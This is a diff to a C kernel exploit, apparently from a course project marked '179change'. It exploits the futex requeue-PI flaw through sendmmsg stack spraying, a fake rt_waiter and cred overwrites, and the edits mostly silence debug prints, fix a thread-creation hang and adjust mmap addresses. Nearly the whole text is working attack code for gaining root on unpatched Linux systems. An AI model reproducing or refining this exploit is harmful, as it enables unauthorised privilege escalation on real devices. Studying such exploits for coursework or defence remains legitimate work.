@@ -170,8 +170,11 @@ ssize_t write_pipe(void *readbuf, void *writebuf, size_t count) {
 void write_kernel(int signum)
 {
     //179change print 
-    printf("wrie kernel fucntion\n");
-	struct thread_info stackbuf;
+    //printf("wrie kernel fucntion\n");
+	/*
+    This thread writes to the kernel but only when sig int is called
+    */
+    struct thread_info stackbuf;
 	unsigned long taskbuf[0x100];
 	struct cred *cred;
 	struct cred credbuf;
@@ -362,7 +365,7 @@ void *make_action(void *arg) {
 
 	prio = (int)arg;
     //179chnage
-    printf("make action, %d\n", prio);
+    //printf("make action, %d\n", prio);
 	last_tid = syscall(__NR_gettid);
     //179change error check
     if (last_tid < 0) {
@@ -374,7 +377,7 @@ void *make_action(void *arg) {
 	pthread_cond_signal(&is_thread_desched);
     
     //179change print
-    printf("make action, write kernel pointer set\n");
+    //printf("make action, write kernel pointer set\n");
 	act.sa_handler = write_kernel;
 	//179change
     //error type
@@ -386,7 +389,7 @@ void *make_action(void *arg) {
 	sigaction(12, &act, NULL);
     
     //179change print 
-    printf("make action, set prio\n");
+    //printf("make action, set prio\n");
 	setpriority(PRIO_PROCESS, 0, prio);
 
 	pthread_mutex_unlock(&is_thread_desched_lock);
@@ -397,7 +400,7 @@ void *make_action(void *arg) {
 		;
 	}
     //179change print
-    printf("make action, futex lock pi, %p, %d\n", &uaddr2, __LINE__);
+    //printf("make action, futex lock pi, %p, %d\n", &uaddr2, __LINE__);
 	ret = syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
     //179change error check
     if (ret < 0) {
@@ -411,13 +414,13 @@ void *make_action(void *arg) {
 	}
 
     //179change print
-    printf("make action exit");
+    //printf("make action exit");
     return NULL;
 }
 
 pid_t wake_actionthread(int prio) {
     //179change print 
-    printf("wake action, waking prio %d\n", prio);
+    //printf("wake action, waking prio %d\n", prio);
 	pthread_t th4;
 	pid_t pid;
 	char filename[256];
@@ -433,7 +436,7 @@ pid_t wake_actionthread(int prio) {
 	pthread_create(&th4, 0, make_action, (void *)prio);
 	pthread_cond_wait(&is_thread_desched, &is_thread_desched_lock);
     //179change
-    printf("thread created\n");
+    //printf("thread created\n");
 
 	pid = last_tid;
 
@@ -458,7 +461,7 @@ pid_t wake_actionthread(int prio) {
 	did_dm_tid_read = 1;
     
     //179change printf 
-    printf("wake action, waiting status context switch\n");
+    //printf("wake action, waiting status context switch\n");
 	while (1) {
 		sprintf(filename, "/proc/self/task/%d/status", pid);
 		fp = fopen(filename, "rb");
@@ -476,16 +479,18 @@ pid_t wake_actionthread(int prio) {
         //179change 
         //stops from hanging
 		//if (vcscnt2 == vcscnt + 1) {
+        //stops program from hanging when creating threads 
+        //sometimes the context switch is greater than one
 		if (vcscnt2 > vcscnt) {
         	break;
 		}
 		usleep(10);
 
 	}
-    printf("wake action, exit waiting context switch\n");
+    //printf("wake action, exit waiting context switch\n");
 	pthread_mutex_unlock(&is_thread_desched_lock);
     
-    printf("wake action, woke prio %d\n", prio);
+    //printf("wake action, woke prio %d\n", prio);
 	return pid;
 }
 
@@ -522,14 +527,18 @@ int make_socket() {
 
 void *send_magicmsg(void *arg) {
     //179change print 
-    printf("starting send msg\n");
-	int sockfd;
+    //printf("starting send msg\n");
+	//this writes to the kernel with send msg
+
+    int sockfd;
     //179change changed mmsghdr to mmsghdr2
 	struct mmsghdr2 msgvec[1];
 	struct iovec msg_iov[10];
     //179change
 	//unsigned long databuf[0x20];
-	unsigned long databuf[0x20];
+	//databuff sets the off set of iovstack 
+    //gets put on the kernal stack as the name
+    unsigned long databuf[0x20]; 
 	int i;
 	int ret;
 
@@ -545,7 +554,8 @@ void *send_magicmsg(void *arg) {
     
     //179change
     //print for magic
-    printf("Magic %ld\n", MAGIC);
+    //printf("Magic %ld\n", MAGIC);
+    //sets the name as 20 perfectly alines already
 	for (i = 0; i < ARRAY_SIZE(databuf); i++) {
 		databuf[i] = MAGIC;
     }
@@ -555,6 +565,9 @@ void *send_magicmsg(void *arg) {
         msg_iov[i].iovbase first 4 bytes
         msg_iov[i].iov_len last 4 bytes
     */
+    //msg_iov puts data on the stack 
+    //base is the first 4 bytes in kernel 
+    //len is the last 4 bytes in kernel 
 	for (i = 0; i < 10; i++) {
         //write 12 to priority
         if (i == 8) {
@@ -587,7 +600,7 @@ void *send_magicmsg(void *arg) {
     //179 change set ret
 	//syscall(__NR_futex, &uaddr1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &uaddr2, 0);
     //print statemet
-    printf("send msg, futex wait requeue pi, %p, %p\n", &uaddr1, &uaddr2);
+    //printf("send msg, futex wait requeue pi, %p, %p\n", &uaddr1, &uaddr2);
 	ret = syscall(__NR_futex, &uaddr1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &uaddr2, 0);
 	if (ret < 0) {
         int errsv = errno;
@@ -603,7 +616,7 @@ void *send_magicmsg(void *arg) {
 
 	ret = 0;
     //179change pring
-    printf("sending message\n");
+    //printf("sending message\n");
 	while (1) {
 		ret = syscall(__NR_sendmmsg, sockfd, msgvec, 1, 0);
 		if (ret <= 0) {
@@ -622,6 +635,7 @@ void *send_magicmsg(void *arg) {
 	return NULL;
 }
 
+//dummy rt_waiter 
 static inline setup_exploit(unsigned long mem)
 {
 	*((unsigned long *)(mem - 0x04)) = 0x81; //prio 9
@@ -649,7 +663,7 @@ void *search_goodnum(void *arg) {
 	//179change set ret error check
     //syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
     //print
-    printf("goodnum, futex lock pi, %p, %d\n", &uaddr2, __LINE__);
+    //printf("goodnum, futex lock pi, %p, %d\n", &uaddr2, __LINE__);
     ret = syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
     if (ret < 0) {
         int errsv = errno;
@@ -659,7 +673,7 @@ void *search_goodnum(void *arg) {
         //179change print
         //error
         //error check
-        printf("goodnum, futex cmp requeue pi, %p, %p\n", &uaddr1, &uaddr2);
+        //printf("goodnum, futex cmp requeue pi, %p, %p\n", &uaddr1, &uaddr2);
 		ret = syscall(__NR_futex, &uaddr1, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr1);
 		if (ret == 1) {
 			break;
@@ -673,7 +687,7 @@ void *search_goodnum(void *arg) {
 	wake_actionthread(6);
 	wake_actionthread(7);
     //179change comment
-    printf("search_goodnum, wake_action 6,7 done\n");
+    //printf("search_goodnum, wake_action 6,7 done\n");
 
 	uaddr2 = 0;
 	do_socket_tid_read = 0;
@@ -682,7 +696,7 @@ void *search_goodnum(void *arg) {
     //179change set ret error check
 	//syscall(__NR_futex, &uaddr2, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr2);
     //print
-    printf("goodnum futex requeue pi, %p\n", &uaddr2);
+    //printf("goodnum futex requeue pi, %p\n", &uaddr2);
 	ret = syscall(__NR_futex, &uaddr2, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr2);
 	if (ret < 0) {
         int errsv = errno;
@@ -743,7 +757,7 @@ void *search_goodnum(void *arg) {
      
     wake_actionthread(11);
     //179change
-    printf("good numgood num woke thread 11");
+    //printf("good numgood num woke thread 11");
 
 	if (*((unsigned long *)MAGIC) == magicval) {
 		printf("using MAGIC_ALT.\n");
@@ -767,7 +781,8 @@ void *search_goodnum(void *arg) {
 
 		pthread_mutex_lock(&is_thread_awake_lock);
         
-        printf("kill pid 12\n");
+        //179change print
+        //printf("kill pid 12\n");
 		if (kill(pid, 12) == -1) {
             int errsv = errno;
             printf("kill error %d", errsv);
@@ -840,7 +855,7 @@ void *search_goodnum(void *arg) {
 				pthread_mutex_lock(&is_thread_awake_lock);
                 
                 //179change 
-				printf("kill pid 12\n");
+				//printf("kill pid 12\n");
                 if (kill(pid, 12) == -1) {
                     int errsv = errno;
                     printf("kill error %d", errsv);
@@ -904,26 +919,29 @@ void init_exploit() {
 	printf("running with pid %d\n", getpid());
     
     //179change print
-    printf("accepting socket\n");
+    //printf("accepting socket\n");
 	pthread_create(&th1, NULL, accept_socket, NULL);
 
+    //address changed from 0xa0000000
+    //32nd bit has to be 0 because will cause negative address in sendmsg
 	//addr = (unsigned long)mmap((void *)0x20000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
 	addr = (unsigned long)mmap((void *)0x50000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
     addr += 0x800;
 	MAGIC = addr;
 	//179change
-    printf("Magic %ld\n", MAGIC);
+    //printf("Magic %ld\n", MAGIC);
     if ((long)addr >= 0) {
         int errsv;
         errsv = errno;
 		printf("first mmap failed? %d\n", errno);
+        //infinite loop removed 
 	}
 
 	addr = (unsigned long)mmap((void *)0x100000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
 	addr += 0x800;
 	MAGIC_ALT = addr;
     //179change
-    printf("Magic alt %ld\n", MAGIC_ALT );
+    //printf("Magic alt %ld\n", MAGIC_ALT );
 	if (addr > 0x110000) {
 		printf("second mmap failed?\n");
 		while (1) {
@@ -931,7 +949,7 @@ void init_exploit() {
 		}
 	}
     //179change print
-    printf("starting exploit\n");
+    //printf("starting exploit\n");
 	pthread_mutex_lock(&done_lock);
 	pthread_create(&th2, NULL, search_goodnum, NULL);
 	pthread_create(&th3, NULL, send_magicmsg, NULL);
